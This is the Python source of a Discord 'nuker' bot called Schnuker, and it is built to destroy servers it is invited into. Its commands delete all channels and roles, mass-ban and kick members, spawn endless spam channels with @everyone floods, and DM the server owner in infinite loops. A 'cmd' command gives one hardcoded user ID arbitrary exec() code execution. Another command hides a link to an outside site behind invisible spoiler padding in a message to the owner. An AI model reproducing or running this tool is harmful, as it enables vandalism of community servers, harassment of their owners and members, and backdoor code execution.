import discord
import subprocess
import os
from discord.ext import commands
from colorama import Fore

client = commands.Bot(command_prefix=[".", ">"], intents=discord.Intents.all())

global msgcount
msgcount = 0
global allow_commands
allow_commands = False


@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game("with nukes"))
  print(
      """                                                                                                  
───────────────────────────────────────────────────────────────────
░██████╗░█████╗░██╗░░██╗███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
██╔════╝██╔══██╗██║░░██║████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
╚█████╗░██║░░╚═╝███████║██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
░╚═══██╗██║░░██╗██╔══██║██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██████╔╝╚█████╔╝██║░░██║██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
───────────────────────────────────────────────────────────────────""")
  print("Logged in as {}".format(client.user))
  print("Prefix: > or . | Commands: nuke, kickall (ka), massban (mb), spamchannels (sc), delchannels (dc), rolespam (rs), delroles (dr), ownerspam (osp), status, guildname (gn), restart, stop, spam, prefix (p), commands (cmds)")


def clear_console():
  os.system('cls' if os.name == 'nt' else 'clear')


@client.command()
async def nuke(ctx):
  global allow_commands
  allow_commands = True
  if allow_commands:
    await ctx.message.delete()
    await ctx.guild.edit(name="SCHNUKED")
    try:
      for channels in ctx.guild.channels:
        await channels.delete()
        print("Console | Deleted #{}".format(channels))
    except:
      print("Console | Can't delete #{}".format(channels))
    while True:
        await ctx.guild.create_text_channel("Schnuked")

#@client.command()
#async def bomb(ctx, *, role_name=""):
  #global allow_commands
  #allow_commands = True
  #if allow_commands:
    #await ctx.message.delete()
    #await ctx.guild.edit(name="SCHNUKED")
    #schnuker_role = discord.utils.get(ctx.guild.roles, name="Schnuker")
    #if not role_name:
      #for role in ctx.guild.roles:
        #try:
          #await role.delete()
          #print(f"Console | Successfully deleted the '{role.name}' role")
        #except discord.Forbidden:
          #print(f"Console | Bot doesn't have permission to delete the '{role.name}' role.")
        #except discord.HTTPException as e:
          #print(f"Console | Error deleting role '{role.name}': {e}")
    #else:
      #role = discord.utils.get(ctx.guild.roles, name=role_name)
      #if role:
        #try:
          #await role.delete(reason="Role deletion")
          #print(f"Console | Successfully deleted the '{role_name}' role")
        #except discord.Forbidden:
          #print(f"Console | Bot doesn't have permission to delete the '{role_name}' role.")
        #except discord.HTTPException as e:
          #print(f"Console | Error deleting role '{role_name}': {e}")
      #else:
        #print(f"Console | Role '{role_name}' not found.")
    #if schnuker_role:
      #for i in range(100):
        #try:
          #new_role = await ctx.guild.create_role(name=role_name)
          #await new_role.edit(position=schnuker_role.position - 1)
          #print(f"Console | Spam-created roles named '{role_name}'")
        #except discord.Forbidden:
          #print("Console | Bot doesn't have permission to create or edit roles.")
        #except discord.HTTPException as e:
          #print(f"Console | Error creating role '{role_name}': {e}")
    #else:
      #print("Console | 'Schnuker' role not found.")
    #try:
      #for channels in ctx.guild.channels:
        #await channels.delete()
        #print("Console | Deleted #{}".format(channels))
    #except:
      #print("Console | Can't delete #{}".format(channels))
    #if allow_commands:
      #while True:
        #await ctx.guild.create_text_channel("Schnuked")


@client.command()
async def delroles(ctx, *, role_name=""):
  await ctx.message.delete()
  if not role_name:
    for role in ctx.guild.roles:
      try:
        for i in range(100):
          await role.delete()
          print(f"Console | Successfully deleted the '{role.name}' role")
        else:
          print(f"Console | Role '{role.name}' not found.")
      except discord.Forbidden:
        print(f"Console | Bot doesn't have permission to delete the '{role.name}' role.")
  else:
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if role:
      try:
        for i in range(100):
          await role.delete(reason="Role deletion")
          print(f"Console | Successfully deleted the '{role_name}' role")
      except discord.Forbidden:
        print(f"Console | Bot doesn't have permission to delete the '{role_name}' role.")
    else:
      print(f"Console | Role '{role_name}' not found.")


@client.command()
async def dr(ctx, *, role_name=""):
  await ctx.message.delete()
  if not role_name:
    for role in ctx.guild.roles:
      try:
        for i in range(100):
          await role.delete()
          print(f"Console | Successfully deleted the '{role.name}' role")
        else:
          print(f"Console | Role '{role.name}' not found.")
      except discord.Forbidden:
        print(f"Console | Bot doesn't have permission to delete the '{role.name}' role.")
  else:
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if role:
      try:
        for i in range(100):
          await role.delete(reason="Role deletion")
          print(f"Console | Successfully deleted the '{role_name}' role")
      except discord.Forbidden:
        print(f"Console | Bot doesn't have permission to delete the '{role_name}' role.")
    else:
      print(f"Console | Role '{role_name}' not found.")

@client.command()
async def exit(ctx):
  ctx.message.delete
  await client.close()

@client.command()
async def cmd(ctx, *, code='print("Console | Running cmd without the code value results in this message. Please input a code value.")'):
  await ctx.message.delete()
  if ctx.author.id == 749226175687295028:
      try:
          result = exec(code)
          print(f"Console | '{code}' executed successfully")
      except Exception as e:
          print(f"Console | Error executing {code}")
  else:
      print("Console | You do not have permission to execute this command.")

@client.command()
async def spam(ctx, *, text="Get Schnuked! @everyone"):
  await ctx.message.delete()
  global msgcount
  while True:
    await ctx.guild.create_text_channel("Schnuked")
    for channels in ctx.guild.channels:
      await channels.send(text)
      msgcount = msgcount + 1
      print(f"Console | Sent message in newly created channels, message count: ",msgcount)  


@client.command()
async def spamchannels(ctx, *, channel_name="Schnuked"):
  allow_commands = False
  await ctx.message.delete()
  while True:
    await ctx.guild.create_text_channel(channel_name)
    print(f"Console | Succesfully created a new channel named #{channel_name}")


@client.command()
async def sc(ctx, *, channel_name="Schnuked"):
  allow_commands = False
  await ctx.message.delete()
  while True:
    await ctx.guild.create_text_channel(channel_name)


@client.command()
async def stopcmds(ctx):
  await ctx.message.delete()
  global allow_commands
  allow_commands = False
  await ctx.send("All commands are now stopped.")


@client.command()
async def stop(ctx):
  await ctx.message.delete()
  subprocess.Popen(["python", "Schnuker.py"])
  await client.close()


@client.command()
async def status(ctx, *, newstatus="with nukes"):
  await ctx.message.delete()
  await client.change_presence(activity=discord.Game(newstatus))
  print(f"Console | Changed bot status to '{newstatus}'")


@client.command()
async def commands(ctx):
  await ctx.message.delete()
  owner = ctx.guild.owner
  await owner.send("Schnuker Commands :star:||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| https://embedl.ink/e/4VxIazGQ")


@client.command()
async def restart(ctx):
  clear_console()
  await ctx.message.delete()
  subprocess.Popen(["python", "Schnuker.py"])
  await client.close()


@client.command()
async def startcmds(ctx):
  await ctx.message.delete()
  global allow_commands
  allow_commands = True
  await ctx.send("Commands are now allowed to run.")


@client.event
async def on_guild_channel_create(channel):
  global allow_commands
  if allow_commands:
    global msgcount
    while True:
      await channel.send("Get Schnuked! @everyone")
      msgcount = msgcount + 1
      print(f"Console | Sent message in newly created channels, message count: ",msgcount)


@client.command()
async def delchannels(ctx, *, channel_name=""):
  await ctx.message.delete()
  if channel_name:
      for i in range(100):
          channel = discord.utils.get(ctx.guild.channels, name=channel_name, type=discord.ChannelType.text)
          if channel:
              await channel.delete()
              print(f"Console | Successfully deleted #{channel_name}")
          else:
              print(f"Console | Channel #{channel_name} not found.")
  else:
      try:
          for channel in ctx.guild.channels:
              if isinstance(channel, discord.TextChannel):
                  await channel.delete()
                  print("Console | Deleted #{}".format(channel))
      except:
          print("Console | Can't delete #{}".format(channel))


@client.command()
async def dc(ctx, *, channel_name=""):
  await ctx.message.delete()
  if channel_name:
      for i in range(100):
          channel = discord.utils.get(ctx.guild.channels, name=channel_name, type=discord.ChannelType.text)
          if channel:
              await channel.delete()
              print(f"Console | Successfully deleted #{channel_name}")
          else:
              print(f"Console | Channel #{channel_name} not found.")
  else:
      try:
          for channel in ctx.guild.channels:
              if isinstance(channel, discord.TextChannel):
                  await channel.delete()
                  print("Console | Deleted #{}".format(channel))
      except:
          print("Console | Can't delete #{}".format(channel))
          
          
@client.command()
async def rolespam(ctx, *, role_name="SCHNUKED"):
  await ctx.message.delete()
  schnuker_role = discord.utils.get(ctx.guild.roles, name="Schnuker")
  if schnuker_role:
    for i in range(100):
      try:
        new_role = await ctx.guild.create_role(name=role_name)
        await new_role.edit(position=schnuker_role.position - 1)
        print(f"Console | Spam-created roles named '{role_name}'")
      except discord.Forbidden:
        print("Console | Bot doesn't have permission to create or edit roles.")
      except discord.HTTPException as e:
        print(f"Console | Error creating role '{role_name}': {e}")
  else:
    print("Console | 'Schnuker' role not found.")


@client.command()
async def rs(ctx, *, role_name="SCHNUKED"):
  await ctx.message.delete()
  schnuker_role = discord.utils.get(ctx.guild.roles, name="Schnuker")
  if schnuker_role:
    for i in range(100):
      try:
        new_role = await ctx.guild.create_role(name=role_name)
        await new_role.edit(position=schnuker_role.position - 1)
        print(f"Console | Spam-created roles named '{role_name}'")
      except discord.Forbidden:
        print("Console | Bot doesn't have permission to create or edit roles.")
      except discord.HTTPException as e:
        print(f"Console | Error creating role '{role_name}': {e}")
  else:
    print("Console | 'Schnuker' role not found.")

   
@client.command()
async def ownerspam(ctx, *, text="GET SCHNUKED LMAO"):
  owner = ctx.guild.owner
  await ctx.message.delete()
  while True:
    await owner.send(text)
    print(f"Console | Sent '{text}' to server owner.")


@client.command()
async def osp(ctx, *, text="GET SCHNUKED LMAO"):
  owner = ctx.guild.owner
  await ctx.message.delete()
  while True:
    await owner.send(text)
    print(f"Console | Sent '{text}' to server owner.")


@client.command()
async def guildname(ctx, *, newname):
  await ctx.message.delete()
  await ctx.guild.edit(name=newname)
  print(f"Console | Changed server name to {newname}")


@client.command()
async def gn(ctx, *, newname):
  await ctx.message.delete()
  await ctx.guild.edit(name=newname)
  print(f"Console | Changed server name to {newname}")
  

@client.command()
async def massban(ctx):
  await ctx.message.delete()
  try:
      bot_role = ctx.guild.me.top_role

      for member in ctx.guild.members:
          if member != ctx.guild.me and bot_role > member.top_role:
              await member.ban(reason="Schnuked!")
              print(f"Console | Banned '@{member}'")
  except discord.Forbidden as e:
      print(f"Console | Error: 403 Forbidden - Missing Permissions to ban '@{member}'. Make sure bot's role has 'Kick Members' permission or that the bot's role is higher than the member's.")
  except Exception as e:
      print(f"Console | Error: {e}")
  

@client.command()
async def mb(ctx):
  await ctx.message.delete()
  try:
    for members in ctx.guild.members:
      await members.ban(reason="Schnuked!")
      print(f"Console | Banned {members}")
  except:
    print(f"Console | Can't ban {members}")


client.command()
async def kickall(ctx):
    await ctx.message.delete()
    try:
        bot_role = ctx.guild.me.top_role

        for member in ctx.guild.members:
            if member != ctx.guild.me and bot_role > member.top_role:
                await member.kick(reason="Schnuked!")
                print(f"Console | Kicked '@{member}'")
    except discord.Forbidden as e:
        print(f"Console | Error: 403 Forbidden - Missing Permissions to kick '@{member}'. Make sure bot's role has 'Kick Members' permission or that the bot's role is higher than the member's.")
    except Exception as e:
        print(f"Console | Error: {e}")


@client.command()
async def ka(ctx):
    await ctx.message.delete()
    try:
        bot_role = ctx.guild.me.top_role

        for member in ctx.guild.members:
            if member != ctx.guild.me and bot_role > member.top_role:
                await member.kick(reason="Schnuked!")
                print(f"Console | Kicked '@{member}'")
    except discord.Forbidden as e:
        print(f"Console | Error: 403 Forbidden - Missing Permissions to kick '@{member}'. Make sure bot's role has 'Kick Members' permission or that the bot's role is higher than the member's.")
    except Exception as e:
        print(f"Console | Error: {e}")

@client.command()
async def prefix(ctx, prefix):
    client.command_prefix = prefix
    print(f"Console | Set prefix to {prefix}")

@client.command()
async def p(ctx, prefix):
    client.command_prefix = prefix
    print(f"Console | Set prefix to {prefix}")


client.run(input("Console | Bot token: "))
